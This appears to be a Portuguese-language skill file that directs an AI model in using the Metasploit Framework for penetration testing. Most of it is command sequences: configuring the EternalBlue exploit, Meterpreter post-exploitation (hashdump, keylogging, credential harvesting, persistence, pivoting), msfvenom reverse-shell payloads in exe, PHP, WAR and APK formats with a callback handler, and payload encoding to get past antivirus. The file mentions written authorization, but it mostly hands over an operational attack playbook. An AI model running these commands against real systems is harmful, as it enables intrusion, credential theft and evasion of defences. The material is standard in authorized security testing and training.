---
name: Metasploit Framework
description: Esta habilidade deve ser usada quando o usuário pede para "usar Metasploit para testes de penetração", "explorar vulnerabilidades com msfconsole", "criar payloads com msfvenom", "realizar pós-exploração", "usar módulos auxiliares para varredura" ou "desenvolver exploits personalizados". Fornece orientação abrangente para aproveitar o Metasploit Framework em avaliações de segurança.
metadata:
  author: zebbern
  version: "1.1"
---

# Metasploit Framework

## Propósito

Aproveitar o Metasploit Framework para testes de penetração abrangentes, desde a exploração inicial até atividades pós-exploração. O Metasploit fornece uma plataforma unificada para exploração de vulnerabilidades, geração de payloads, varredura auxiliar e manutenção de acesso a sistemas comprometidos durante avaliações de segurança autorizadas.

## Pré-requisitos

### Ferramentas Necessárias
```bash
# Metasploit vem pré-instalado no Kali Linux
# Para outros sistemas:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Inicie o PostgreSQL para suporte de banco de dados
sudo systemctl start postgresql
sudo msfdb init
```

### Conhecimento Necessário
- Fundamentos de rede e sistemas
- Compreensão de vulnerabilidades e exploits
- Conceitos básicos de programação
- Técnicas de enumeração de alvo

### Acesso Necessário
- Autorização escrita para teste
- Acesso de rede aos sistemas alvo
- Compreensão do escopo e regras de engajamento

## Saídas e Entregas

1. **Evidência de Exploração** - Screenshots e logs de comprometimentos bem-sucedidos
2. **Logs de Sessão** - Histórico de comandos e dados extraídos
3. **Mapeamento de Vulnerabilidades** - Vulnerabilidades exploradas com referências de CVE
4. **Artefatos Pós-Exploração** - Credenciais, arquivos e informações de sistema

## Fluxo de Trabalho Principal

### Fase 1: Fundamentos do MSFConsole

Inicie e navegue pelo console do Metasploit:

```bash
# Inicie o msfconsole
msfconsole

# Modo silencioso (pule o banner)
msfconsole -q

# Comandos de navegação básicos
msf6 > help                    # Mostrar todos os comandos
msf6 > search [term]           # Pesquisar módulos
msf6 > use [module]            # Selecionar módulo
msf6 > info                    # Mostrar detalhes do módulo
msf6 > show options            # Exibir opções necessárias
msf6 > set [OPTION] [value]    # Configurar opção
msf6 > run / exploit           # Executar módulo
msf6 > back                    # Retornar ao console principal
msf6 > exit                    # Sair do msfconsole
```

### Fase 2: Tipos de Módulo

Compreenda as diferentes categorias de módulos:

```bash
# 1. Módulos Exploit - Direcionam vulnerabilidades específicas
msf6 > show exploits
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 2. Módulos Payload - Código executado após exploração
msf6 > show payloads
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 3. Módulos Auxiliares - Varredura, fuzzing, enumeração
msf6 > show auxiliary
msf6 > use auxiliary/scanner/smb/smb_version

# 4. Módulos Pós-Exploração - Ações após comprometimento
msf6 > show post
msf6 > use post/windows/gather/hashdump

# 5. Encoders - Ofuscar payloads
msf6 > show encoders
msf6 > set ENCODER x86/shikata_ga_nai

# 6. Nops - Preenchimento no-operation para buffer overflows
msf6 > show nops

# 7. Evasion - Contornar controles de segurança
msf6 > show evasion
```

### Fase 3: Pesquisando Módulos

Encontre módulos apropriados para alvos:

```bash
# Pesquisar por nome
msf6 > search eternalblue

# Pesquisar por CVE
msf6 > search cve:2017-0144

# Pesquisar por plataforma
msf6 > search platform:windows type:exploit

# Pesquisar por tipo e palavra-chave
msf6 > search type:auxiliary smb

# Filtrar por rank (excellent, great, good, normal, average, low, manual)
msf6 > search rank:excellent

# Pesquisa combinada
msf6 > search type:exploit platform:linux apache

# Ver colunas de resultados da pesquisa:
# Name, Disclosure Date, Rank, Check (se pode verificar vulnerabilidade), Description
```

### Fase 4: Configurando Exploits

Configure um exploit para execução:

```bash
# Selecione módulo exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Veja opções necessárias
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Configure host alvo
msf6 exploit(...) > set RHOSTS 192.168.1.100

# Configure porta alvo (se diferente do padrão)
msf6 exploit(...) > set RPORT 445

# Veja payloads compatíveis
msf6 exploit(...) > show payloads

# Configure payload
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Configure host local para conexão reversa
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# Veja todas as opções novamente para verificar
msf6 exploit(...) > show options

# Verifique se o alvo é vulnerável (se suportado)
msf6 exploit(...) > check

# Execute exploit
msf6 exploit(...) > exploit
# ou
msf6 exploit(...) > run
```

### Fase 5: Tipos de Payload

Selecione payload apropriado para a situação:

```bash
# Singles - Autossuficiente, sem staging
windows/shell_reverse_tcp
linux/x86/shell_bind_tcp

# Stagers - Payload pequeno que baixa estágio maior
windows/meterpreter/reverse_tcp
linux/x86/meterpreter/bind_tcp

# Stages - Baixado por stager, fornece funcionalidade completa
# Meterpreter, VNC, shell

# Convenção de nomenclatura de payload:
# [platform]/[architecture]/[payload_type]/[connection_type]
# Exemplos:
windows/x64/meterpreter/reverse_tcp
linux/x86/shell/bind_tcp
php/meterpreter/reverse_tcp
java/meterpreter/reverse_https
android/meterpreter/reverse_tcp
```

### Fase 6: Sessão Meterpreter

Trabalhe com pós-exploração do Meterpreter:

```bash
# Após exploração bem-sucedida, você obtém prompt Meterpreter
meterpreter >

# Informações de Sistema
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# Operações de Sistema de Arquivos
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Users
meterpreter > download file.txt /tmp/
meterpreter > upload /tmp/tool.exe C:\\

# Gerenciamento de Processos
meterpreter > ps
meterpreter > migrate [PID]
meterpreter > kill [PID]

# Rede
meterpreter > ipconfig
meterpreter > netstat
meterpreter > route
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.1

# Escalação de Privilégio
meterpreter > getsystem
meterpreter > getprivs

# Coleta de Credenciais
meterpreter > hashdump
meterpreter > run post/windows/gather/credentials/credential_collector

# Screenshots e Keylogging
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Acesso a Shell
meterpreter > shell
C:\Windows\system32> whoami
C:\Windows\system32> exit
meterpreter >

# Sessão em Background
meterpreter > background
msf6 exploit(...) > sessions -l
msf6 exploit(...) > sessions -i 1
```

### Fase 7: Módulos Auxiliares

Use módulos auxiliares para reconhecimento:

```bash
# Scanner de Versão SMB
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# Scanner de Portas
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set PORTS 1-1000
msf6 auxiliary(...) > run

# Scanner de Versão SSH
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# FTP Login Anônimo
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# Scanner de Diretórios HTTP
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# Módulos de Força Bruta
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USER_FILE /usr/share/wordlists/users.txt
msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(...) > run
```

### Fase 8: Módulos Pós-Exploração

Execute módulos post em sessões ativas:

```bash
# Liste sessões
msf6 > sessions -l

# Execute módulo post em sessão específica
msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 1
msf6 post(...) > run

# Ou execute diretamente do Meterpreter
meterpreter > run post/windows/gather/hashdump

# Módulos Post Comuns
# Coleta de Credenciais
post/windows/gather/credentials/credential_collector
post/windows/gather/lsa_secrets
post/windows/gather/cachedump
post/multi/gather/ssh_creds

# Enumeração de Sistema
post/windows/gather/enum_applications
post/windows/gather/enum_logged_on_users
post/windows/gather/enum_shares
post/linux/gather/enum_configs

# Escalação de Privilégio
post/windows/escalate/getsystem
post/multi/recon/local_exploit_suggester

# Persistência
post/windows/manage/persistence_exe
post/linux/manage/sshkey_persistence

# Pivoting
post/multi/manage/autoroute
```

### Fase 9: Geração de Payload com msfvenom

Crie payloads autossuficientes:

```bash
# Shell reverso básico Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Shell reverso Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# Shell reverso PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# Shell reverso Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# Payload PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# Shell web ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# Arquivo WAR (Tomcat)
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war

# APK Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk

# Payload codificado (evite AV)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Listar formatos disponíveis
msfvenom --list formats

# Listar encoders disponíveis
msfvenom --list encoders
```

### Fase 10: Configurando Handlers

Configure ouvinte para conexões recebidas:

```bash
# Configuração manual de handler
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j

# A flag -j executa como job em background
msf6 > jobs -l

# Quando payload executa no alvo, sessão se abre
[*] Meterpreter session 1 opened

# Interaja com sessão
msf6 > sessions -i 1
```

## Referência Rápida

### Comandos MSFConsole Essenciais

| Comando | Descrição |
|---------|-----------|
| `search [term]` | Pesquisar módulos |
| `use [module]` | Selecionar módulo |
| `info` | Exibir informações do módulo |
| `show options` | Mostrar opções configuráveis |
| `set [OPT] [val]` | Definir valor de opção |
| `setg [OPT] [val]` | Definir opção global |
| `run` / `exploit` | Executar módulo |
| `check` | Verificar vulnerabilidade alvo |
| `back` | Desselecionar módulo |
| `sessions -l` | Listar sessões ativas |
| `sessions -i [N]` | Interagir com sessão |
| `jobs -l` | Listar jobs em background |
| `db_nmap` | Executar nmap com banco de dados |

### Comandos Meterpreter Essenciais

| Comando | Descrição |
|---------|-----------|
| `sysinfo` | Informações de sistema |
| `getuid` | Usuário atual |
| `getsystem` | Tentar escalação de privilégio |
| `hashdump` | Extrair hashes de senha |
| `shell` | Cair para shell de sistema |
| `upload/download` | Transferência de arquivo |
| `screenshot` | Capturar tela |
| `keyscan_start` | Iniciar keylogger |
| `migrate [PID]` | Mover para outro processo |
| `background` | Sessão em background |
| `portfwd` | Encaminhamento de porta |

### Módulos Exploit Comuns

```bash
# Windows
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/smb/ms08_067_netapi
exploit/windows/http/iis_webdav_upload_asp
exploit/windows/local/bypassuac

# Linux
exploit/linux/ssh/sshexec
exploit/linux/local/overlayfs_priv_esc
exploit/multi/http/apache_mod_cgi_bash_env_exec

# Aplicações Web
exploit/multi/http/tomcat_mgr_upload
exploit/unix/webapp/wp_admin_shell_upload
exploit/multi/http/jenkins_script_console
```

## Restrições e Limitações

### Requisitos Legais
- Use apenas em sistemas que você possui ou tem autorização escrita para testar
- Documente todas as atividades de teste
- Siga as regras de engajamento
- Relate todos os achados às partes apropriadas

### Limitações Técnicas
- Antivírus/EDR moderno pode detectar payloads Metasploit
- Alguns exploits exigem configurações específicas de alvo
- Regras de firewall podem bloquear conexões reversas
- Nem todos os exploits funcionam em todas as versões de alvo

### Segurança Operacional
- Use canais criptografados (reverse_https) quando possível
- Limpe artefatos após teste
- Evite detecção por sistemas de monitoramento
- Limite pós-exploração ao escopo acordado

## Solução de Problemas

| Problema | Soluções |
|----------|----------|
| Banco de dados não conectado | Execute `sudo msfdb init`, inicie PostgreSQL, depois `db_connect` |
| Exploit falha/sem sessão | Execute `check`; verifique arquitetura de payload; verifique firewall; tente payloads diferentes |
| Sessão encerra imediatamente | Migre para processo estável; use payload sem staging; verifique AV; use AutoRunScript |
| Payload detectado por AV | Use codificação `-e x86/shikata_ga_nai -i 10`; use módulos evasion; templates personalizados |